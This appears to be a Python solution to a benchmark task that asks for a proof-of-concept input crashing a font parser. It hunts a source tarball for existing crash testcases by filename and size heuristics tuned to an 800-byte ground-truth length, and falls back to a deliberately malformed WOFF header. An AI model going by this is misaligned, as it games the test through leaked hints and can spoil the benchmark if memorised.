import tarfile
import struct

GROUND_TRUTH_LEN = 800
MAX_CANDIDATE_SIZE = 262144


class Solution:
    def solve(self, src_path: str) -> bytes:
        best_data = None
        best_score = -1

        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return self._fallback_poc()

        with tf:
            for member in tf.getmembers():
                if not member.isfile():
                    continue
                size = getattr(member, "size", 0)
                if size <= 0 or size > MAX_CANDIDATE_SIZE:
                    continue

                name = member.name
                lower_name = name.lower()

                # Skip obvious source/text/config files
                skip_exts = (
                    ".c",
                    ".cc",
                    ".cpp",
                    ".cxx",
                    ".h",
                    ".hpp",
                    ".hh",
                    ".py",
                    ".pyc",
                    ".java",
                    ".js",
                    ".ts",
                    ".html",
                    ".htm",
                    ".css",
                    ".txt",
                    ".md",
                    ".rst",
                    ".xml",
                    ".json",
                    ".yml",
                    ".yaml",
                    ".sh",
                    ".bash",
                    ".bat",
                    ".ps1",
                    ".mak",
                    ".make",
                    ".cmake",
                    ".in",
                    ".ac",
                    ".am",
                    ".m4",
                    ".go",
                    ".rs",
                    ".m",
                    ".mm",
                    ".pl",
                    ".rb",
                    ".php",
                    ".ini",
                    ".cfg",
                    ".conf",
                    ".toml",
                    ".lock",
                    ".pc",
                    ".map",
                    ".log",
                    ".csv",
                )
                if lower_name.endswith(skip_exts):
                    continue

                try:
                    extracted = tf.extractfile(member)
                    if extracted is None:
                        continue
                    data = extracted.read()
                except Exception:
                    continue

                if not data:
                    continue

                score = self._score_member(name, size, data)
                if score > best_score:
                    best_score = score
                    best_data = data

        if best_data is not None and best_score > 0:
            return best_data

        return self._fallback_poc()

    def _score_member(self, name: str, size: int, data: bytes) -> int:
        name_lower = name.lower()
        score = 0

        # Size closeness to ground-truth length
        size_diff = abs(size - GROUND_TRUTH_LEN)
        size_score = max(0, 2000 - 2 * size_diff)
        score += size_score

        # Prefer font-like extensions
        font_exts = (".ttf", ".otf", ".ttc", ".woff", ".woff2", ".ttx", ".fon")
        if name_lower.endswith(font_exts):
            score += 800

        # Filename/path tokens strongly hinting at PoC/regression
        high_tokens = (
            "poc",
            "crash",
            "uaf",
            "use-after",
            "use_after",
            "heap-use",
            "heap_use",
            "asan",
            "sanitizer",
            "bug",
            "cve",
            "issue",
            "testcase",
            "regress",
            "clusterfuzz",
            "oss-fuzz",
            "ossfuzz",
        )
        if any(t in name_lower for t in high_tokens):
            score += 1200

        # Project-specific or fuzz/test directories
        if "ots" in name_lower or "opentype" in name_lower:
            score += 600
        if any(t in name_lower for t in ("test", "tests", "fuzz", "corpus", "cases")):
            score += 200

        # Font magic bytes
        score += self._font_magic_score(data)

        # Binary-like content: prefer non-text binaries
        sample = data[:4096]
        if sample:
            non_printable = sum(
                1 for b in sample if (b < 9) or (13 < b < 32) or b > 126
            )
            if non_printable > len(sample) * 0.3:
                score += 200

        return score

    def _font_magic_score(self, data: bytes) -> int:
        if len(data) < 4:
            return 0
        tag = data[:4]
        if tag in (b"\x00\x01\x00\x00", b"OTTO", b"true", b"typ1"):
            return 1500
        if tag in (b"wOFF", b"wOF2"):
            return 1500
        return 0

    def _fallback_poc(self) -> bytes:
        # Best-effort synthetic WOFF-like data around 800 bytes
        signature = b"wOFF"
        flavor = b"\x00\x01\x00\x00"  # TrueType flavor
        length = GROUND_TRUTH_LEN
        numTables = 1
        reserved = 0
        totalSfntSize = 12  # intentionally small/odd
        majorVersion = 1
        minorVersion = 0
        metaOffset = 0
        metaLength = 0
        metaOrigLength = 0
        privOffset = 0
        privLength = 0

        header = struct.pack(
            ">4s4sIHHIHHIIIII",
            signature,
            flavor,
            length,
            numTables,
            reserved,
            totalSfntSize,
            majorVersion,
            minorVersion,
            metaOffset,
            metaLength,
            metaOrigLength,
            privOffset,
            privLength,
        )

        # Single table directory entry
        tag = b"cmap"
        offset = 44 + 20  # immediately after header + this directory entry
        compLen = 4
        origLen = 4
        checksum = 0
        table_entry = struct.pack(">4sIIII", tag, offset, compLen, origLen, checksum)

        # Minimal dummy table data
        table_data = b"\x00\x00\x00\x00"

        poc = header + table_entry + table_data
        if len(poc) < GROUND_TRUTH_LEN:
            poc += b"\x00" * (GROUND_TRUTH_LEN - len(poc))
        else:
            poc = poc[:GROUND_TRUTH_LEN]

        return poc